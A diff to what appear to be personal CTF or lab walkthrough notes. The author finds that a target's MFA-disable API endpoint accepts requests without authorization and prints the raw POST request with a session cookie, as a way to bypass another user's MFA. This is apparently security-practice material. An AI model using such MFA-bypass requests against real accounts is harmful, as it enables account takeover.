@@ -103,5 +103,24 @@ I get access but this user has MFA enabled!
 
 So i already know the password is correct, but i need the MFA code to get access to the dashboard
 
-Ill log back into brian and play with the enabled function
+Ill log back into brian and play with the enabled MFA function
+
+So enabling it doesnt do anything interesting, but disabling it calls an API with no auth at all
+
+```python
+POST /api/mfa/disable HTTP/1.1
+Host: embedded.hsm:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://embedded.hsm:8080/dashboard
+Origin: http://embedded.hsm:8080
+Connection: keep-alive
+Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiUtw.UXn5tt18leXKnrc3YlQ9jPAZssg
+Priority: u=0
+Content-Length: 0
+```
+
+
 
